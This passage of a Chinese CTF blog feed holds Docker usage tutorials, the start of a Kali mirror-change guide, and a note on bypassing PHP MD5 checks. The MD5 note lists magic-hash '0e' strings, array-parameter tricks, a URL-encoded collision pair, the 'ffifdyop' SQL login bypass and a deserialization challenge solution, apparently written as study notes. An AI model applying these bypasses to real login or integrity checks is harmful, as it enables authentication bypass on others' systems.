class="attribute">docker</span> stop <span class="number">39</span>c</span><br></pre></td></tr></table></figure><p>（2）查看所有容器的运行状态（包含运行中的和已停止的）。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>3、删除容器（39c），查看所有容器的运行状态。<br>（1）删除容器。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rm <span class="number">39</span>c</span><br></pre></td></tr></table></figure><p>（2）查看所有容器的运行状态（包含运行中的和已停止的）。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>（3）容器（39c）已经不存在了，说明被成功删除了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5绕过</title>
      <link href="/posts/cfe09059.html"/>
      <url>/posts/cfe09059.html</url>
      
        <content type="html"><![CDATA[<p>记录网站：【CTF_Web：php弱类型绕过与md5碰撞 - CSDN App】<a href="http://t.csdnimg.cn/A58wf">http://t.csdnimg.cn/A58wf</a></p><h4 id="MD5函数漏洞"><a href="#MD5函数漏洞" class="headerlink" title="MD5函数漏洞"></a>MD5函数漏洞</h4><p>$str1 = $_GET[‘str1’];<br>$str2 = $_GET[‘str2’];<br>if (md5($str1) == md5($str2)){<br>die(‘OK’); }</p><p>php弱类型比较产生的漏洞<br>想要满足这个判断只需要构造出MD5值为0e开头的字符串，这样的话弱类型比较会认为是科学技术法，0的多少次方都是0，因此可以绕过MD5</p><p>编码后0e开头的字符串：<br>QNKCDZO（0e830400451993494058024219903391）<br>aabg7XSs（0e087386482136013740957780965295）<br>aaabEgHn（0e418636035810609803317995275027）<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>还有MD5和双MD5以后的值都是0e开头的<br>CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM</p><h4 id="md5-数组绕过。"><a href="#md5-数组绕过。" class="headerlink" title="md5()数组绕过。"></a>md5()数组绕过。</h4><p>如果我们传入/?name[]=1，那$name的值就是一个数组，name[]=1,2也一样，两个数组进行比较的时候会比较数组内的元素，但md5编码就不一样了，md5()函数统一把数组当成字符串array，这也就导致只要两个都是数组，那他们的md5编码都一样，都为字符串array的md5编码。</p><p>PHP特性<br>$str1 = $_GET[‘str1’];<br>$str2 = $_GET[‘str2’];</p><p>if (md5($str1) === md5($str2)) {<br>die(‘OK’);<br>}</p><p>因为是强类型比较，用0e开头的字符串是没办法绕过的了，但是PHP自身的特性使得可以提交一个数组，<br>而md5函数传入数组的返回值都是NULL，这样就可以绕过强类型比较了。所以这里用GET传入?str1[]=1&amp;str2[]=2就行了<br>补充：md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$str1和$str2都是数组则双双返回FALSE,<br>两个FALSE相等得以绕过</p><h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><p>$str1 = (string)$_GET[‘str1’];<br>$str2 = (string)$_GET[‘str2’];</p><p>if (md5($str1) === md5($str2)) {<br>die(‘OK’);<br>}</p><p>由于强制类型转换，传数组就不可行了，这里就需要MD5碰撞，对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll就可以了</p><h4 id="绕过md5-来构造攻击语句"><a href="#绕过md5-来构造攻击语句" class="headerlink" title="绕过md5()来构造攻击语句"></a>绕过md5()来构造攻击语句</h4><p>select * from ‘admin’ where password=md5($pass,true)</p><h4 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h4><p>这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’。等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p><h4 id="md5碰撞（最强解）"><a href="#md5碰撞（最强解）" class="headerlink" title="md5碰撞（最强解）"></a>md5碰撞（最强解）</h4><p>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3<em>Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB</em>%07%FE%A2</p><p>$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3<em>Bu%93%D8Igm%A0%D1U%5D%83%60%FB</em>%07%FE%A2</p><p>以0e开头的原字符串md5后的密文还是以0e开头<br>0e215962017</p><h4 id="超过精确度的弱类型问题"><a href="#超过精确度的弱类型问题" class="headerlink" title="超过精确度的弱类型问题"></a>超过精确度的弱类型问题</h4><p>超过精确度的数字(小数点后超过17位)在进行弱类型比较时，会出 现相等的情况。例如var_dump(0.99999999999999999==1)的结果为 True。</p><h4 id="in-arrray-函数"><a href="#in-arrray-函数" class="headerlink" title="in_arrray()函数"></a>in_arrray()函数</h4><p>in_array()函数的基本格式为:in_array($search,Array())，表示搜索 $search是否为数组Array()的元素。in_array()函数实际上存在第三个参 数，该参数默认为false。如果第三个参数设置为true，则判断$search与 数组的值类型是否相同，即进行强类型比较;若第三个参数设置为 false，则in_array()函数进行判断的时候，会强制将$search的值转换为 数组的值类型，此时就是弱类型比较。</p><h4 id="eregi-函数"><a href="#eregi-函数" class="headerlink" title="eregi()函数"></a>eregi()函数</h4><p>eregi()函数用于在一个字符串中搜索指定模式的字符串，搜索时不区分 大小写。<br>关于eregi()函数的考点一般为:eregi()函数可以被%00截断(PHP5版 本，该函数在PHP7中被弃用)。<br>eregi(“111”.substr($input,0,1),”1114”) and substr($input,0,1) !=4<br>该语句要求$input的第一个字符不能为4，但同时要求字符串111与 $input的第一个字符拼接后的结果必须能够匹配字符串1114。按照常 理，这是相互矛盾的，此时可以使用%00来进行输入。请注意，%00在 此处表示一个字符，即\0。之所以会出现截断问题，是因为PHP的底层 是基于C语言实现的，而在C语言里，字符串是以\0作为结尾的。</p><h4 id="md5长度限制强相等"><a href="#md5长度限制强相等" class="headerlink" title="md5长度限制强相等"></a>md5长度限制强相等</h4><p>总思路：传相同字符的不同数据类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$d</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$ctf</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;d = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;s = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;s;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;s) &amp;&amp; (<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="variable language_">$this</span>-&gt;s != <span class="variable language_">$this</span>-&gt;b)) &#123;</span><br><span class="line">                <span class="variable">$dsb</span> = <span class="variable language_">$this</span>-&gt;d.<span class="variable language_">$this</span>-&gt;s.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$dsb</span>) &lt;= <span class="number">3</span>) &amp;&amp; (<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;ctf) &lt;= <span class="number">3</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="variable">$dsb</span> !== <span class="variable language_">$this</span>-&gt;ctf) &amp;&amp; (<span class="variable language_">$this</span>-&gt;ctf !== <span class="variable">$dsb</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$dsb</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ctf)) &#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;dsbctf&quot;</span>]);</span><br></pre></td></tr></table></figure><p>1.php浮点数常量NAN和INF：<br>在PHP中，NAN是一个特殊的浮点数值，表示非数值（Not-A-Number）。当一个运算无法计算结果时，比如零除以零，就会产生NAN。<br>PHP中的INF是一个特殊的浮点数值，表示无穷大（Infinity）。当数值超过PHP_FLOAT_MAX或者使用一些数学函数产生极大或极小的结果时，就会得到INF。</p><p><img src="https://i-blog.csdnimg.cn/direct/3274e38e37864a8bab5c7d727b9e087d.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6bf426412d004c1e88db877f6816fd1e.png" alt="img"></p><p>利用思路：<br>php浮点数常量NAN和INF:<br>使用浮点常量INF分别给ctf和dsb变量赋值，长度都为3，dsb是字符串类型，ctf是浮点型，由于MD5是以字符串形式进行加密的，所以他们的MD5值是相等的。这样就达到了绕过的目的。</p><p>2.dsb会被转化成字符串类型，但是ctf不会，所以可以利用不同类型的相同字符绕过。比如：</p><p>md5(‘123’)=md5(123)</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker run 运行镜像</title>
      <link href="/posts/3445c523.html"/>
      <url>/posts/3445c523.html</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-run-运行镜像"><a href="#Docker-run-运行镜像" class="headerlink" title="Docker run 运行镜像"></a>Docker run 运行镜像</h1><p>docker run ：创建一个新的容器并运行一个命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">docker run <span class="selector-attr">[OPTIONS]</span> IMAGE <span class="selector-attr">[COMMAND]</span> <span class="selector-attr">[ARG...]</span></span><br><span class="line">OPTIONS说明：</span><br><span class="line"></span><br><span class="line">-<span class="selector-tag">a</span> stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</span><br><span class="line"></span><br><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line"></span><br><span class="line">-<span class="selector-tag">i</span>: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line"></span><br><span class="line">-P: 随机端口映射，容器内部端口随机映射到主机的端口</span><br><span class="line"></span><br><span class="line">-<span class="selector-tag">p</span>: 指定端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line"></span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -<span class="selector-tag">i</span> 同时使用；</span><br><span class="line"></span><br><span class="line"><span class="attr">--name</span>=<span class="string">&quot;nginx-lb&quot;</span>: 为容器指定一个名称；</span><br><span class="line"></span><br><span class="line"><span class="attr">--dns</span> <span class="number">8.8</span>.<span class="number">8.8</span>: 指定容器使用的DNS服务器，默认和宿主一致；</span><br><span class="line"></span><br><span class="line"><span class="attr">--dns-search</span> example<span class="selector-class">.com</span>: 指定容器DNS搜索域名，默认和宿主一致；</span><br><span class="line"></span><br><span class="line">-h <span class="string">&quot;mars&quot;</span>: 指定容器的hostname；</span><br><span class="line"></span><br><span class="line">-e username=<span class="string">&quot;ritchie&quot;</span>: 设置环境变量；</span><br><span class="line"></span><br><span class="line"><span class="attr">--env-file</span>=<span class="selector-attr">[]</span>: 从指定文件读入环境变量；</span><br><span class="line"></span><br><span class="line"><span class="attr">--cpuset</span>=<span class="string">&quot;0-2&quot;</span> or <span class="attr">--cpuset</span>=<span class="string">&quot;0,1,2&quot;</span>: 绑定容器到指定CPU运行；</span><br><span class="line"></span><br><span class="line">-m :设置容器使用内存最大值；</span><br><span class="line"></span><br><span class="line"><span class="attr">--net</span>=<span class="string">&quot;bridge&quot;</span>: 指定容器的网络连接类型，支持 bridge/host/<span class="attribute">none</span>/container: 四种类型；</span><br><span class="line"></span><br><span class="line"><span class="attr">--link</span>=<span class="selector-attr">[]</span>: 添加链接到另一个容器；</span><br><span class="line"></span><br><span class="line"><span class="attr">--expose</span>=<span class="selector-attr">[]</span>: 开放一个端口或一组端口；</span><br><span class="line"></span><br><span class="line"><span class="attr">--volume</span> , -v: 绑定一个卷</span><br></pre></td></tr></table></figure><p>Docker 镜像只有运行起来，才会创建一个容器，才能提供对外服务</p><p>这里我们先不解释什么是镜像，我们只解释它们之间的关系和类比</p><p>我们先说镜像，镜像有点类似于已经打包好了，放在腾讯服务器上的，但还没有装在电脑上的 QQ 安装程序</p><p>那么容器，就相当于一个已经在用户电脑上安装好的 QQ 软件，只要输入 QQ 号和密码，就可以使用了</p><p>它们之间一样么？ 不一样的</p><ol><li>QQ 安装程序，人人都可以下，但是只要不安装，它就不能使用，它只是一个安装程序而已</li><li>已经安装好的 QQ 程序，这时候就不是人人都能用了，只有电脑的主人才能用，而且这时候可以登录然后聊天了</li></ol><p>相比较于 Docker ，我们只有把一个镜像 <code>run</code> 起来，它才能对外提供服务</p><p>将一个镜像转换成容器，使用的就是 <code>docker run</code> 命令</p><h2 id="Docker-Hello-World"><a href="#Docker-Hello-World" class="headerlink" title="Docker Hello World"></a>Docker Hello World</h2><p><code>docker run</code> 命令可以从一个镜像创建一个容器，并运行一个应用程序</p><p>比如下面的 <code>docker run</code> 命令从 <code>ubuntu:17.10</code> 镜像创建一个容器，并运行 <code>echo &quot;Hello world&quot;</code> 服务输出 Hello world</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run ubuntu:<span class="number">17.10</span> /bin/<span class="keyword">echo</span> <span class="string">&quot;Hello world&quot;</span></span><br><span class="line">Unable <span class="keyword">to</span> <span class="keyword">find</span> image <span class="string">&#x27;ubuntu:17.10&#x27;</span> locally</span><br><span class="line"><span class="number">17.10</span>: Pulling from library/ubuntu</span><br><span class="line"><span class="number">68393378</span>db12: Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">9</span>e3366501e0e: Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">156</span>ec05da9a5: Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">281</span>cba1133d9: Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">0</span>acdc2cc8ed1: Pull <span class="built_in">complete</span> </span><br><span class="line">Digest: <span class="built_in">sha256</span>:<span class="number">20</span>ed22f88148889c94970cb325b5341f455c820aa6d3289ce4b721b14c78c242</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> ubuntu:<span class="number">17.10</span></span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>docker</td><td>Docker 的二进制执行文件</td></tr><tr><td>run</td><td>与前面的 docker 组合来运行一个容器</td></tr><tr><td>ubuntu:17.10</td><td>指定要运行的镜像，Docker 首先从本地主机上查找镜像是否存在 如果不存在，Docker 就会从镜像仓库 Docker Hub 下载公共镜像</td></tr><tr><td>/bin/echo “Hello world</td><td>在启动的容器里执行的命令</td></tr></tbody></table></div><p>更多 <code>docker start</code> 命令使用方法，可以访问 <a href="https://twle.cn/l/yufei/docker/docker-basic-start-command.html">docker start 命令</a></p><h2 id="运行交互式的容器"><a href="#运行交互式的容器" class="headerlink" title="运行交互式的容器"></a>运行交互式的容器</h2><p>使用 <code>docker run</code> 如果添加了 <code>-i</code> 和 <code>-t</code> 或者 <code>-it</code> 参数，那么 Docker 就会创建一个交互式的容器，可以实现应答模式</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@localhost</span> ~]<span class="comment"># docker run -i -t ubuntu:17.10 /bin/bash</span></span><br><span class="line">root<span class="variable">@1bc08b56d08f</span><span class="symbol">:/</span><span class="comment">#  </span></span><br></pre></td></tr></table></figure><blockquote><p>这次执行的时候没有从远程拉取 ubuntu:17.10 镜像了，而是使用的本地版本</p></blockquote><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-t</td><td>在新容器内指定一个伪终端或终端</td></tr><tr><td>-i</td><td>允许对容器内的标准输入 ( STDIN ) 进行交互</td></tr></tbody></table></div><p>当出现 <code>root@1bc08b56d08f:/#</code> 之后，就进入了 <code>ubuntu 17.10</code> 系统的容器</p><p>我们可以在 <code>root@1bc08b56d08f:/#</code> 之后输入一些 <a href="https://twle.cn/l/yufei/man/man-basic-index.html">Linux 命令</a> ，比如使用 <code>cat /proc/version</code> 和 <code>ls</code> 分别查看当前系统的版本信息和当前目录下的文件列表</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">1</span>bc08b56d08f:/# cat /<span class="keyword">proc</span>/version<span class="title"></span></span><br><span class="line"><span class="title">Linux</span> version 4.9.87-linuxkit-aufs (root@95fa5ec30613) (gcc<span class="title"> version</span> 6.4.0 (Alpine 6.4.0) ) #1<span class="title"> SMP</span> Wed<span class="title"> Mar</span> 14 15:12:16<span class="title"> UTC</span> 2018<span class="title"></span></span><br><span class="line"><span class="title">root@1bc08b56d08f:/#</span> ls<span class="title"></span></span><br><span class="line"><span class="title">bin</span> <span class="title"> boot</span> <span class="title"> dev</span> <span class="title"> etc</span> <span class="title"> home</span> <span class="title"> lib</span> <span class="title"> lib64</span> <span class="title"> media</span> <span class="title"> mnt</span> <span class="title"> opt</span> <span class="title"> proc</span> <span class="title"> root</span> <span class="title"> run</span> <span class="title"> sbin</span> <span class="title"> srv</span> <span class="title"> sys</span> <span class="title"> tmp</span> <span class="title"> usr</span> <span class="title"> var</span></span><br></pre></td></tr></table></figure><p>如果要推出交互式容器，可以运行 <code>exit</code> 命令或者使用 <code>CTRL+D</code> 组合键</p><h2 id="后台模式"><a href="#后台模式" class="headerlink" title="后台模式"></a>后台模式</h2><p>跟所有的 <code>Linux</code> 应用程序一样，如果不使用后台模式，那么它们一直会独占 <strong>终端</strong>，如果退出了终端，那么容器就会自动退出</p><p>所以，一般情况下我们都希望使用后台模式运行一个容器，可以添加 <code>-d</code> 参数</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="title">@localhost</span> ~]# docker run -d ubuntu:<span class="number">17.10</span> /bin/sh -<span class="keyword">c</span> <span class="string">&quot;while true; do echo hello world; sleep 1; done&quot;</span></span><br><span class="line"><span class="number">4558</span>b<span class="number">3</span>b<span class="number">54</span>da<span class="number">0</span>ff<span class="number">34</span>fa<span class="number">4</span><span class="keyword">c</span><span class="number">4</span>bc<span class="number">6</span>fb<span class="number">2</span><span class="keyword">c</span><span class="number">3303</span>b<span class="number">2</span>b<span class="number">3</span>f<span class="number">602</span>fad<span class="number">046</span>b<span class="number">205</span>b<span class="number">342</span>b<span class="number">9</span>babc<span class="number">21</span>d<span class="number">6</span></span><br></pre></td></tr></table></figure><p>使用后台模式，日志就不会输出到标准输出了，也就是不会显示在 <strong>终端</strong> 上了</p><p>这时候显示出来的，当前容器的 ID。</p><p>每个容器的 ID 都是唯一的，我们可以通过容器的 ID 来查看容器的状态和容器的所有信息</p><h2 id="查看容器运行状况"><a href="#查看容器运行状况" class="headerlink" title="查看容器运行状况"></a>查看容器运行状况</h2><p>如果想要查看容器的运行状况，可以使用 <code>docker ps</code> 命令</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID  IMAGE        <span class="string">...</span>  STATUS        <span class="string">...</span></span><br><span class="line">4558b3b54da0  ubuntu<span class="function">:17.10</span> <span class="string">...</span>  Up 2 minutes  <span class="string">...</span></span><br></pre></td></tr></table></figure><p><code>docker ps</code> 命令只会显示所有正在运行的容器</p><p>如果想要查看所有的容器，那么需要添加 <code>-a</code> 参数</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID  <span class="string">...</span>  STATUS                    <span class="string">...</span></span><br><span class="line">4558b3b54da0  <span class="string">...</span>  Up 2 minutes              <span class="string">...</span></span><br><span class="line">e08201b591<span class="keyword">cd</span>  <span class="string">...</span>  Exited <span class="params">(0)</span> 15 minutes ago <span class="string">...</span></span><br><span class="line">6801e4604a32  <span class="string">...</span>  Exited <span class="params">(0)</span> 15 minutes ago <span class="string">...</span></span><br></pre></td></tr></table></figure><p>更多 <code>docker ps</code> 命令使用方法，可以访问 <a href="https://twle.cn/l/yufei/docker/docker-basic-ps-command.html">docker ps 命令</a></p><h2 id="查看容器的运行日志"><a href="#查看容器的运行日志" class="headerlink" title="查看容器的运行日志"></a>查看容器的运行日志</h2><p>后台容器的输出不会显示在 <strong>终端</strong> 上，而是被 <code>Docker</code> 收集起来了</p><p>我们可以通过 <code>docker logs</code> 命令查看容器的日志</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs <span class="tag">&lt;<span class="name">container_id</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例如想要查看容器 <code>4558b3b54da0</code> 的日志，可以使用下面的命令</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># docker logs 4558b3b54da0</span></span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>更多 <code>docker logs</code> 命令使用方法，可以访问 <a href="https://twle.cn/l/yufei/docker/docker-basic-logs-command.html">docker logs 命令</a></p><h2 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h2><p>如果想要主动停止容器，可以使用 <code>docker stop</code> 命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">stop</span> <span class="symbol">&lt;container_id&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以使用下面的命令来停止容器 <code>4558b3b54da0</code></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># docker stop 4558b3b54da0</span></span><br><span class="line"><span class="number">4558</span>b3b54da0</span><br></pre></td></tr></table></figure><p><code>docker stop</code> 命令的返回值是停止的容器 ID</p><p>现在通过 <code>docker ps -a</code> 查看，容器已经停止工作</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID  <span class="string">...</span> STATUS                     <span class="string">...</span></span><br><span class="line">6801e4604a32  <span class="string">...</span> Exited <span class="params">(0)</span> 15 minutes ago  <span class="string">...</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali换源</title>
      <link href="/posts/35bc9a82.html"/>
      <url>/posts/35bc9a82.html</url>
      
        <content type="html"><![CDATA[<p>一.更换源<br>   1.<br>      进入Kali Linux系统并打开命令行窗口，输入“ sudo -i ”回车输入密码以获取系统最高权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su                        <span class="comment">#获取系统最高权限命令</span></span><br></pre></td></tr></table></figure><p>   2.<br>      输入vim /etc/apt/sources.list编辑软件源配置文件。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources<span class="meta">.list</span>      <span class="meta">#使用vim访问源</span></span><br></pre></td></tr></table></figure><p>   3.<br>      将官方源如下加入“ # ”注释掉。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#官方源</span></span><br><span class="line"></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line"></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><p> 